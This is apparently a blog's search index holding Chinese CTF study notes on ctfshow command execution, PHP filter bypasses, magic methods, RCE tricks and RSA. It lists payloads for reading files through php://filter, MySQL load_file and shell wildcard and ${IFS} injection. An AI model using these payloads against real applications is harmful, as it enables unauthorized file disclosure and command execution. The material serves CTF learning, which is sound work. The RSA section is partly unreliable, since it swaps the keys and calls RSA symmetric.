<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ctfshow命令执行总结</title>
    <link href="/2024/03/10/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/"/>
    <url>/2024/03/10/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>c&#x3D;highlight_file(“flag.php”);<br>c&#x3D;require(“flag.php”);<br>c&#x3D;include(“flag.php”);<br>c&#x3D;show_source(“flag.php”);<br>c&#x3D;print_r(scandir(“&#x2F;“));<br>c&#x3D;var_export(glob(‘..&#x2F;..&#x2F;..’.’&#x2F;*’));<br>c&#x3D;var_dump(scandir(“&#x2F;“);<br>c&#x3D;var_export(scandir(“&#x2F;“);<br>c&#x3D;print_r(scandir(dirname(‘FILE’)));<br>c&#x3D;include($_POST[‘a’]);&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>利用glob协议扫描目录的命令：<br>c&#x3D;?&gt;<?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');}exit(0);?>(扫描根目录下的所有文件);<br>mysql的load_file读取文件<br>c&#x3D;$conn &#x3D; mysqli_connect(“127.0.0.1”, “root”, “root”, “ctftraining”); $sql &#x3D; “select load_file(‘&#x2F;flag36.txt’) as a”; $row &#x3D; mysqli_query($conn, $sql); while($result&#x3D;mysqli_fetch_array($row)){ echo $result[‘a’]; } exit();<br>提前送出缓冲区或终止程序<br>        $s &#x3D; ob_get_contents();<br>        ob_end_clean();<br>        echo preg_replace(“&#x2F;[0-9]|[a-z]&#x2F;i”,”?”,$s);<br>源码劫持了输出缓冲并且将数字和字母替换成了?。<br>法一<br>在劫持输出缓冲区之前就把缓冲区送出，可以用的函数有：<br>ob_flush();<br>ob_end_flush();<br>payload示例：<br>c&#x3D;include(‘&#x2F;flag.txt’);ob_flush();<br>法二<br>提前终止程序，即执行完代码直接退出，可以调用的函数有：<br>exit();<br>die();<br>payload示例：<br>c&#x3D;include(‘&#x2F;flag.txt’);exit();</p><p>来自 <a href="https://ctf.show/writeups/1188993">https://ctf.show/writeups/1188993</a> </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>布尔盲注</title>
    <link href="/2024/03/01/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    <url>/2024/03/01/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RSA</title>
    <link href="/2024/02/29/RSA/"/>
    <url>/2024/02/29/RSA/</url>
    
    <content type="html"><![CDATA[<p>RSA算法非常简单，概述如下：</p><p>找两素数p和q</p><p>取n&#x3D;p*q</p><p>取t&#x3D;(p-1)*(q-1)</p><p>取任何一个数e,要求满足e&lt;t并且e与t互素（就是最大公因数为1）</p><p>取d*e%t&#x3D;&#x3D;1</p><p>这样最终得到三个数： n d e</p><p>设消息为数M (M &lt;n)</p><p>设m&#x3D;(c**d)%n就得到了加密后的消息c </p><p>设c&#x3D;(m**e)%n则 m &#x3D;&#x3D; M，从而完成对c的解密。</p><p>注：**表示次方,上面两式中的d和e可以互换。</p><p>在对称加密中：</p><p>n d两个数构成公钥，可以告诉别人；</p><p>n e两个数构成私钥，e自己保留，不让任何人知道。</p><p>给别人发送的信息使用e加密，只要别人能用d解开就证明信息是由你发送的，构成了签名机制。</p><p>别人给你发送信息时使用d加密，这样只有拥有e的你能够对其解密。</p><p>rsa的安全性在于对于一个大数n，没有有效的方法能够将其分解</p><p>从而在已知n d的情况下无法获得e；同样在已知n e的情况下无法</p><p>求得d。</p><p>给出了p,q,e,c的脚本<br>p&#x3D;0x928fb6aa9d813b6c3270131818a7c54edb18e3806942b88670106c1821e0326364194a8c49392849432b37632f0abe3f3c52e909b939c91c50e41a7b8cd00c67d6743b4f<br>q&#x3D;0xec301417ccdffa679a8dcc4027dd0d75baf9d441625ed8930472165717f4732884c33f25d4ee6a6c9ae6c44aedad039b0b72cf42cab7f80d32b74061<br>e&#x3D;0x10001<br>c&#x3D;0x70c9133e1647e95c3cb99bd998a9028b5bf492929725a9e8e6d2e277fa0f37205580b196e5f121a2e83bc80a8204c99f5036a07c8cf6f96c420369b4161d2654a7eccbdaf583204b645e137b3bd15c5ce865298416fd5831cba0d947113ed5be5426b708b89451934d11f9aed9085b48b729449e461ff0863552149b965e22b6<br>p&#x3D;int(‘0x928fb6aa9d813b6c3270131818a7c54edb18e3806942b88670106c1821e0326364194a8c49392849432b37632f0abe3f3c52e909b939c91c50e41a7b8cd00c67d6743b4f’,16)<br>q&#x3D;int(‘0xec301417ccdffa679a8dcc4027dd0d75baf9d441625ed8930472165717f4732884c33f25d4ee6a6c9ae6c44aedad039b0b72cf42cab7f80d32b74061’,16)<br>e&#x3D;int(‘0x10001’,16)<br>c&#x3D;int(‘0x70c9133e1647e95c3cb99bd998a9028b5bf492929725a9e8e6d2e277fa0f37205580b196e5f121a2e83bc80a8204c99f5036a07c8cf6f96c420369b4161d2654a7eccbdaf583204b645e137b3bd15c5ce865298416fd5831cba0d947113ed5be5426b708b89451934d11f9aed9085b48b729449e461ff0863552149b965e22b6’,16)<br>import gmpy2<br>from Crypto.Util.number import long_to_bytes<br>n&#x3D;p<em>q<br>phi_n&#x3D;(q-1)</em>(p-1)<br>d&#x3D;gmpy2.invert(e,phi_n)<br>m&#x3D;pow(c,d,n)<br>print(long_to_bytes(m))</p><p>来自 <a href="https://www.nssctf.cn/note/set/287">https://www.nssctf.cn/note/set/287</a> </p><p>1、求两整数的最大公因数</p><pre><code class="hljs">1. importgmpy22. #求整数a、b的最大公因数3. a = gmpy2.gcd(3,12)4. print(a)5. 输出 3</code></pre><p>来自 <a href="https://blog.csdn.net/Luiino/article/details/124615969">https://blog.csdn.net/Luiino/article/details/124615969</a><br>2、判断一个数是否为素数</p><pre><code class="hljs">1. importgmpy22. #判断一个数是否为素数3. a = gmpy2.is_prime(5)4. print(a)</code></pre><p>输出：True</p><p>来自 <a href="https://blog.csdn.net/Luiino/article/details/124615969">https://blog.csdn.net/Luiino/article/details/124615969</a> </p><p>3、判断一个数是否为偶&#x2F;奇数</p><pre><code class="hljs">1. importgmpy22. #判断一个数是否为偶数3. a = gmpy2.is_even(4)4. ##判断一个数是否为奇数5. b = gmpy2.is_odd(4)6. print(a)7. print(b)</code></pre><p>来自 <a href="https://blog.csdn.net/Luiino/article/details/124615969">https://blog.csdn.net/Luiino/article/details/124615969</a> </p><p>4、求一个数开x次方</p><pre><code class="hljs">1. importgmpy22. #求一个数开x次方3. a = gmpy2.iroot(8,3)4. print(a)</code></pre><p>输出：(mpz(2), True)</p><p>来自 <a href="https://blog.csdn.net/Luiino/article/details/124615969">https://blog.csdn.net/Luiino/article/details/124615969</a> </p><p>5、初始化大整数（暂时还不晓得有什么意义）</p><pre><code class="hljs">1. #初始化大整数2. a = gmpy2.mpz(234324324234)3. print(a)</code></pre><p>输出：234324324234</p><p>来自 <a href="https://blog.csdn.net/Luiino/article/details/124615969">https://blog.csdn.net/Luiino/article/details/124615969</a> </p><p>6、求一个数模x的逆元y</p><pre><code class="hljs">1. importgmpy22. #求一个数模x的逆元y3. #如3*4 = 1 mod 114. a = gmpy2.invert(3,11)5. print(a)</code></pre><p>输出：4</p><p>来自 <a href="https://blog.csdn.net/Luiino/article/details/124615969">https://blog.csdn.net/Luiino/article/details/124615969</a> </p><p>7、求一个整数的x次幂模y取余（主要用于RSA中）</p><pre><code class="hljs">1. importgmpy22. #求一个整数的x次幂模y取余3. #如3^3 mod 4(即27%4)4. a = gmpy2.powmod(3,3,4)5. print(a)</code></pre><p>输出：3</p><p>来自 <a href="https://blog.csdn.net/Luiino/article/details/124615969">https://blog.csdn.net/Luiino/article/details/124615969</a> </p><p>python中调用MD5<br>Import hashlib<br>print(hashlib.md5(str(d).encode(‘utf-8’)).hexdigest());</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php特性</title>
    <link href="/2024/02/29/php%E7%89%B9%E6%80%A7/"/>
    <url>/2024/02/29/php%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<p>intval绕过：<br>科学计数法绕过</p><p>当函数中用字符串方式表示科学计数法时，函数的返回值是科学计数法前面的一个数，而对于科学计数法加数字则会返回科学计数法的数值</p><p> echo intval(1e10);              &#x2F;&#x2F; 1410065408<br> echo intval(‘1e10’);            &#x2F;&#x2F; 1<br> echo intval(‘1e10’+1);          &#x2F;&#x2F; 1410065409</p><p>MD5<br>方法二：科学计数法绕过<br>原理：可以传入两个md5加密后是0e开头的字符串，但这个以0e开头的字符串只能是纯数字，这样php在进行科学计算法的时候会将它转化为0。</p><p>来自 <a href="https://blog.csdn.net/m0_56691564/article/details/127380406?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170125687516800227441175%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170125687516800227441175&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-127380406-null-null.142%5Ev96%5Epc_search_result_base2&amp;utm_term=ctf%20md5%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/m0_56691564/article/details/127380406?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170125687516800227441175%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170125687516800227441175&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-127380406-null-null.142^v96^pc_search_result_base2&amp;utm_term=ctf%20md5%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4187</a> </p><p>0e215962017经过MD5加密后还是以0e开头</p><p>preg_match()函数</p><p>preg_match 函数用于执行一个正则表达式匹配。</p><p>详细用法可以参考：<a href="https://www.runoob.com/php/php-preg_match.html">https://www.runoob.com/php/php-preg_match.html</a></p><p>绕过方法：preg_match只能处理字符串，如果不按规定传一个字符串，通常是传一个数组进去，这样就会报错,如果正则不匹配多行(&#x2F;m)也可用上面的换行方法绕过</p><pre><code class="hljs">if(isset($_GET[&#39;num&#39;]))&#123;    $num = $_GET[&#39;num&#39;];    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;[t1]         die(&quot;no no no!&quot;);    &#125;    if(intval($num))&#123;        echo $flag;    &#125;&#125;//?num[]=1上面介绍过了，intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1</code></pre><p>str_replace函数</p><p>str_replace() 函数用于替换字符串中指定字符（区分大小写）</p><pre><code class="hljs">&lt;?phpecho str_replace(&quot;world&quot;,&quot;Peter&quot;,&quot;Hello world!&quot;);?&gt;//输出：Hello Peter!str_replace(find,replace,string,count)参数描述find必需。规定要查找的值。replace必需。规定替换 find 中的值的值。string必需。规定被搜索的字符串。count可选。一个变量，对替换数进行计数。</code></pre><p>绕过方法：str_replace无法迭代过滤 ，可以通过双写绕过</p><pre><code class="hljs">$sql=$_GET[&#39;s&#39;];$sql=str_replace(&#39;select&#39;,&#39;&#39;,$sql);echo $sql;?&gt;//?s=sselectelect</code></pre><p>————————————————<br>版权声明：本文为CSDN博主「码啊码」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/m0_48108919/article/details/123279251">https://blog.csdn.net/m0_48108919/article/details/123279251</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>魔术方法</title>
    <link href="/2024/01/29/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
    <url>/2024/01/29/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>常见的魔术方法有：__construct()、__destruct()、__get()、toString()、__sleep()、wakeup()、__invoke() 等等<br>construct:<br>__construct()名为构造函数，会在创建对象时调用</p><img src="/2024/01/29/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/1.png" class=""><p>destruct:<br>__destruct()名为析构函数，会在销毁对象时调用</p><img src="/2024/01/29/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/2.png" class=""><p>get()&amp; set():<br>__get() :读取不可访问（protected 或 private）或不存在的属性的值时</p><p>__set():在给不可访问（protected 或 private）或不存在的属性赋值时(不常用)</p><img src="/2024/01/29/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/3.png" class=""><p>可以看到，因为类中没有b变量，所以当尝试调用b的时候会调用到__get()方法</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Rce</title>
    <link href="/2024/01/25/Rce/"/>
    <url>/2024/01/25/Rce/</url>
    
    <content type="html"><![CDATA[<p>1、查看根目录内容<br>c&#x3D;var_dump(scandir(‘&#x2F;‘));或者c&#x3D;var_export(scandir(‘&#x2F;‘));或者c&#x3D;print_r(scandir(“&#x2F;“));或者system(‘ls &#x2F;‘);或者echo <code>ls /</code>;<br>2、查看文件内容<br>highlight_file(“flag.php”);或者include(“flag.txt”);或者require(‘flag.php’);或者system(‘tac(cat) &#x2F;‘);或者echo <code>tac(cat) /</code>;</p><p>文件重命名：<br>如过滤了很多命令可以尝试使用文件重命名：<br>例：<br>?c&#x3D;mv${IFS}fl??.???${IFS}a.txt<br>把flag.php重命名为了a.txt<br>然后直接访问a.txt就行了</p><p>过滤掉字母没过滤掉数字：<br>?c&#x3D;&#x2F;???&#x2F;????64 ????.???<br>意思为：?c&#x3D;&#x2F;bin&#x2F;base64 flag.php</p><p>?c&#x3D;nl&lt;fla’’g.php<br>nl：查看源码；<br>&lt;，&lt;&gt;：代替空格(不能搭配通配符)<br>c&#x3D;tac&lt;&gt;fla’’g.php||<br>c&#x3D;tac&lt;fla’’g.php||</p><p>管道符:<br>1、|（就是按位或），直接执行|后面的语句</p><p>2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</p><p>3、&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假</p><p>4、&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p><p>5、;（&amp;一样的作用）在linux下用</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
